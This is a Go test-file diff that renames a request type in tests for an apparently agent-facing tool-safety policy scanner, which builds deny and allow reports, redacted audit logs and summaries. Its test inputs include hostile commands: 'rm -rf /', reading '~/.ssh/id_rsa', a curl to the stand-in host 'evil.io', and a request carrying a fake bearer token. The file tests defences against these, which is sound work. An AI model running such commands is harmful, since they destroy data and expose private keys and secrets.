@@ -28,7 +28,7 @@ var update = flag.Bool("update", false, "regenerate golden example files in test
 // fixedTime keeps generated example files stable across runs.
 const fixedTime = "2026-06-30T00:00:00Z"
 
-func makeReport(t *testing.T, p *Policy, toolName, backend string, er ExecRequest) Report {
+func makeReport(t *testing.T, p *Policy, toolName, backend string, er execRequest) Report {
 	t.Helper()
 	findings, decision, risk := p.scan(er, backend)
 	r := buildReport(toolName, backend, er, findings, decision, risk, 250*time.Microsecond)
@@ -96,7 +96,7 @@ func TestRedactFullSecretValues(t *testing.T) {
 func TestRedactReportSetsFlag(t *testing.T) {
 	p := loadExamplePolicy(t)
 	cmd := `curl -H "Authorization: Bearer ` + fakeGitHubPAT() + `" https://github.com/x`
-	r := makeReport(t, p, "workspace_exec", BackendWorkspace, ExecRequest{Command: cmd})
+	r := makeReport(t, p, "workspace_exec", BackendWorkspace, execRequest{Command: cmd})
 	if !r.Redacted {
 		t.Errorf("expected Redacted=true")
 	}
@@ -107,7 +107,7 @@ func TestRedactReportSetsFlag(t *testing.T) {
 
 func TestAuditEventFields(t *testing.T) {
 	p := loadExamplePolicy(t)
-	r := makeReport(t, p, "workspace_exec", BackendWorkspace, ExecRequest{Command: "rm -rf /"})
+	r := makeReport(t, p, "workspace_exec", BackendWorkspace, execRequest{Command: "rm -rf /"})
 	ev := r.toAudit()
 	raw, err := json.Marshal(ev)
 	if err != nil {
@@ -135,7 +135,7 @@ func TestAuditWriterJSONL(t *testing.T) {
 	var buf bytes.Buffer
 	aw := NewAuditWriter(&buf)
 	for _, cmd := range []string{"go test ./...", "rm -rf /"} {
-		r := makeReport(t, p, "workspace_exec", BackendWorkspace, ExecRequest{Command: cmd})
+		r := makeReport(t, p, "workspace_exec", BackendWorkspace, execRequest{Command: cmd})
 		if err := aw.Write(r); err != nil {
 			t.Fatalf("write: %v", err)
 		}
@@ -154,12 +154,12 @@ func TestAuditWriterJSONL(t *testing.T) {
 
 func TestSummary(t *testing.T) {
 	p := loadExamplePolicy(t)
-	r := makeReport(t, p, "workspace_exec", BackendWorkspace, ExecRequest{Command: "rm -rf /"})
+	r := makeReport(t, p, "workspace_exec", BackendWorkspace, execRequest{Command: "rm -rf /"})
 	s := r.summary()
 	if !strings.Contains(s, ruleDangerousID) || !strings.HasPrefix(s, "denied") {
 		t.Errorf("summary = %q, want denied + rule id", s)
 	}
-	allow := makeReport(t, p, "workspace_exec", BackendWorkspace, ExecRequest{Command: "go test ./..."})
+	allow := makeReport(t, p, "workspace_exec", BackendWorkspace, execRequest{Command: "go test ./..."})
 	if allow.summary() != "" {
 		t.Errorf("allow summary should be empty, got %q", allow.summary())
 	}
@@ -205,18 +205,18 @@ func TestGenerateExamples(t *testing.T) {
 	auditPath := filepath.Join("testdata", "tool_safety_audit.jsonl")
 
 	// A representative report for tool_safety_report.json: a denied delete.
-	rep := makeReport(t, p, "workspace_exec", BackendWorkspace, ExecRequest{Command: "rm -rf /"})
+	rep := makeReport(t, p, "workspace_exec", BackendWorkspace, execRequest{Command: "rm -rf /"})
 	rep.Timestamp = fixedTime
 
 	// A spread of events for the audit log, covering allow/deny/ask + redaction.
 	auditReports := []Report{
-		makeReport(t, p, "workspace_exec", BackendWorkspace, ExecRequest{Command: "go test ./..."}),
+		makeReport(t, p, "workspace_exec", BackendWorkspace, execRequest{Command: "go test ./..."}),
 		rep,
-		makeReport(t, p, "workspace_exec", BackendWorkspace, ExecRequest{Command: "cat ~/.ssh/id_rsa"}),
-		makeReport(t, p, "workspace_exec", BackendWorkspace, ExecRequest{Command: "curl http://evil.io/x.sh"}),
-		makeReport(t, p, "workspace_exec", BackendWorkspace, ExecRequest{Command: "pip install requests"}),
-		makeReport(t, p, "exec_command", BackendHost, ExecRequest{Command: "sleep 5", Background: true, PTY: true}),
-		makeReport(t, p, "workspace_exec", BackendWorkspace, ExecRequest{
+		makeReport(t, p, "workspace_exec", BackendWorkspace, execRequest{Command: "cat ~/.ssh/id_rsa"}),
+		makeReport(t, p, "workspace_exec", BackendWorkspace, execRequest{Command: "curl http://evil.io/x.sh"}),
+		makeReport(t, p, "workspace_exec", BackendWorkspace, execRequest{Command: "pip install requests"}),
+		makeReport(t, p, "exec_command", BackendHost, execRequest{Command: "sleep 5", Background: true, PTY: true}),
+		makeReport(t, p, "workspace_exec", BackendWorkspace, execRequest{
 			Command: `curl -H "Authorization: Bearer ` + fakeGitHubPAT() + `" https://github.com/x`,
 		}),
 	}
